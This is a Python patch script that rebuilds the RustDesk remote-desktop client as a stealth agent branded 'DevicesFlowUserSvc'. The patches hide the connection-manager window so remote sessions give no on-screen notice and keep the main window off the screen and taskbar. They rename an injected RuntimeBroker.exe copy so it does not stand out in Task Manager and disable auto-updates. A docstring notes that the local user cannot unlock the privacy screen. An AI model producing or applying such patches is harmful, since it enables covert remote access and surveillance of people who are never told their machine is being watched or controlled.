#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DevicesFlowUserSvc 受控端 UI 补丁。

用法: python patch_agent_ui.py <rustdesk 源码根目录>

做三件事：
1. main.dart 补 import 并把首页 `? const DesktopTabPage()` 换成 `? const AgentPage()`
   （整个窗口变成 250x148 的 ID + 修改访问密码小窗）；
2. 关掉 runMainApp 里的自动更新检查（agent 版不接受上游更新推送）；
3. main.cpp 窗口标题常量 L"RustDesk" -> L"DevicesFlowUserSvc"
   （上游硬编码，workflow 的 appname sed 不覆盖此文件）。
"""

import os
import re
import sys

BRAND = 'DevicesFlowUserSvc'
IMPORT_LINE = "import 'package:flutter_hbb/desktop/pages/agent_page.dart';"
UNLOCK_WATCHER_MARK = 'hy_local_unlock_watcher'


def patch_main_dart(root):
    main_dart = os.path.join(root, 'flutter', 'lib', 'main.dart')
    if not os.path.isfile(main_dart):
        raise SystemExit('main.dart not found: %s' % main_dart)

    with open(main_dart, encoding='utf-8') as f:
        src = f.read()

    if IMPORT_LINE not in src:
        m = re.search(
            r"^import 'package:flutter_hbb/desktop/pages/desktop_tab_page\.dart';\s*$",
            src, re.M)
        if m:
            src = src[:m.end()] + '\n' + IMPORT_LINE + src[m.end():]
        else:
            idx = src.rfind('\nimport ')
            end = src.find('\n', idx + 1)
            src = src[:end + 1] + IMPORT_LINE + '\n' + src[end + 1:]

    if 'const AgentPage()' not in src:
        n = src.count('? const DesktopTabPage()')
        if n == 0:
            raise SystemExit('patch failed: DesktopTabPage call site not found')
        src = src.replace('? const DesktopTabPage()', '? const AgentPage()')

    # 关闭自动更新检查（runMainApp 内），agent 版只接受 MSI 静默重装升级
    src = src.replace('  checkUpdate();\n',
                      '  // agent build: auto update disabled\n',
                      1)

    with open(main_dart, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)
    print('patched main.dart (home -> AgentPage, checkUpdate disabled)')


def patch_main_cpp(root):
    main_cpp = os.path.join(root, 'flutter', 'windows', 'runner', 'main.cpp')
    if not os.path.isfile(main_cpp):
        raise SystemExit('main.cpp not found: %s' % main_cpp)

    with open(main_cpp, encoding='utf-8') as f:
        src = f.read()

    old = 'std::wstring app_name = L"RustDesk";'
    if old not in src:
        if 'L"%s"' % BRAND in src:
            print('main.cpp already branded')
            return
        raise SystemExit('patch failed: app_name anchor not found in main.cpp')
    src = src.replace(old, 'std::wstring app_name = L"%s";' % BRAND)

    with open(main_cpp, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)
    print('patched main.cpp window title -> %s' % BRAND)


def patch_broker_exe(root):
    """隐私屏子进程改名：RuntimeBroker_rustdesk.exe -> RuntimeBroker_<brand>.exe。

    隐私屏开启时受控端把 System32\\RuntimeBroker.exe 复制一份并注入遮挡 DLL，
    复制品名带 rustdesk 会在任务管理器穿帮，改成品牌名。
    """
    p = os.path.join(root, 'src', 'privacy_mode', 'win_topmost_window.rs')
    if not os.path.isfile(p):
        raise SystemExit('win_topmost_window.rs not found: %s' % p)

    with open(p, encoding='utf-8') as f:
        src = f.read()

    old = 'RuntimeBroker_rustdesk.exe'
    new = 'RuntimeBroker_%s.exe' % BRAND.lower()
    if old not in src:
        if new in src:
            print('broker exe already renamed')
            return
        raise SystemExit('patch failed: broker exe name anchor not found')
    src = src.replace(old, new)

    with open(p, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)
    print('patched privacy broker exe -> %s' % new)


def patch_privacy_local_unlock(root):
    """本地解锁已整体禁用（2026-11-10）：隐私屏只能由管理端远程解除。

    1. 遮挡窗口 DLL（privacy_dllmain.cpp）的 Ctrl+P 键盘钩子与
       GetAsyncKeyState 轮询由 HY_ENABLE_LOCAL_UNLOCK=0 编译开关关闭；
    2. 这里不再向 win_topmost_window.rs 注入 flag 文件监听——
       %ProgramData%\\DevicesFlowUserSvc\\privacy_unlock.flag 任何本地
       用户都能手工创建，保留监听等于给「本地解锁」留后门；
    3. 上游 turn_off_privacy 仍由管理端远程调用（关闭隐私模式/断开连接），
       不受影响。
    """
    print('skip privacy local unlock: disabled by design')


def patch_cm_hide(root):
    """受控端连接时不弹任何提示窗口：连接管理器（CM）窗口强制隐藏。

    上游逻辑：CM 进程启动时读 cm 配置 hide_cm == 'true' 才隐藏；但设置界面
    里写这个配置的开关已被上游注释掉，实际永远 false → 每次有人连上来，
    受控端右下角都弹出「连接管理器」窗口（用户报「受控端连接出现提示窗口」）。
    这里在 agent 构建里强制隐藏：
      1. main.dart runConnectionManagerScreen：hide 恒为 true；
      2. server_model.dart：hideCm 字段默认 true（timerCallback / 客户端
         状态更新里所有 showCmWindow 都被 !hideCm 守卫，一并关死）。
    """
    # 1) main.dart
    p = os.path.join(root, 'flutter', 'lib', 'main.dart')
    if not os.path.isfile(p):
        raise SystemExit('main.dart not found: %s' % p)
    with open(p, encoding='utf-8') as f:
        src = f.read()

    if 'agent 隐身：连接管理器窗口永不显示' not in src:
        anchor = ("  final hide = await bind.cmGetConfig(name: \"hide_cm\")"
                  " == 'true';\n"
                  "  gFFI.serverModel.hideCm = hide;\n")
        if anchor not in src:
            raise SystemExit('patch failed: cm hide anchor not found in main.dart')
        new = ("  // 【HyDesk】agent 隐身：连接管理器窗口永不显示（连接无任何提示）。\n"
               "  // 上游 hide_cm 配置的设置入口已被注释，恒为 false，这里直接强制。\n"
               "  final hide = true;\n"
               "  gFFI.serverModel.hideCm = hide;\n")
        src = src.replace(anchor, new, 1)
        with open(p, 'w', encoding='utf-8', newline='\n') as f:
            f.write(src)
        print('patched main.dart: CM window never shown')
    else:
        print('main.dart CM hide already patched')

    # 2) server_model.dart
    p2 = os.path.join(root, 'flutter', 'lib', 'models', 'server_model.dart')
    if not os.path.isfile(p2):
        print('skip cm hide: server_model.dart not found')
        return
    with open(p2, encoding='utf-8') as f:
        src = f.read()

    if 'agent 隐身：CM 窗口默认隐藏' not in src:
        anchor = '  bool hideCm = false;\n'
        if anchor not in src:
            raise SystemExit('patch failed: hideCm anchor not found')
        src = src.replace(
            anchor,
            '  bool hideCm = true; // 【HyDesk】agent 隐身：CM 窗口默认隐藏\n',
            1)
        with open(p2, 'w', encoding='utf-8', newline='\n') as f:
            f.write(src)
        print('patched server_model.dart: hideCm defaults true')
    else:
        print('server_model.dart hideCm already patched')


def read(p):
    with open(p, encoding='utf-8-sig') as f:
        return f.read()


def write(p, src):
    with open(p, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)


def patch_agent_window_never_shows(root):
    """agent 主窗口（AgentPage）开机/安装/服务拉起时不再弹出。

    用户报「静默安装过程总有弹窗」：runMainApp 收尾无条件 windowManager.show()，
    服务每次在用户会话拉起 agent 进程（开机/装完/升级）都会弹出那个
    208x96 的「修改访问密码」小窗。这里改成启动即隐藏 + 不进任务栏。
    """
    p = os.path.join(root, 'flutter', 'lib', 'main.dart')
    src = read(p)
    mark = 'agent 隐身：主窗口开机/安装后不弹出'
    if mark in src:
        print('main.dart agent window hide already patched')
        return
    old = ('      windowManager.show();\n'
           '      windowManager.focus();\n'
           '      // Move registration of active main window here to prevent'
           ' from async visible check.\n')
    if old not in src:
        raise SystemExit('patch failed: runMainApp show anchor not found')
    new = ('      // 【HyDesk】' + mark + '（静默安装无任何弹窗）\n'
           '      windowManager.hide();\n'
           '      windowManager.setSkipTaskbar(true);\n'
           '      // Move registration of active main window here to prevent'
           ' from async visible check.\n')
    src = src.replace(old, new, 1)
    write(p, src)
    print('patched main.dart: agent main window never shows on startup')


def main():
    root = sys.argv[1] if len(sys.argv) > 1 else '.'
    if not os.path.isfile(os.path.join(root, 'flutter', 'lib', 'main.dart')):
        page = os.path.join(root, 'flutter', 'lib', 'desktop', 'pages',
                            'agent_page.dart')
        if not os.path.isfile(page):
            raise SystemExit('agent_page.dart not found: %s' % page)
    patch_main_dart(root)
    patch_main_cpp(root)
    patch_broker_exe(root)
    patch_privacy_local_unlock(root)
    patch_cm_hide(root)
    patch_agent_window_never_shows(root)


if __name__ == '__main__':
    main()
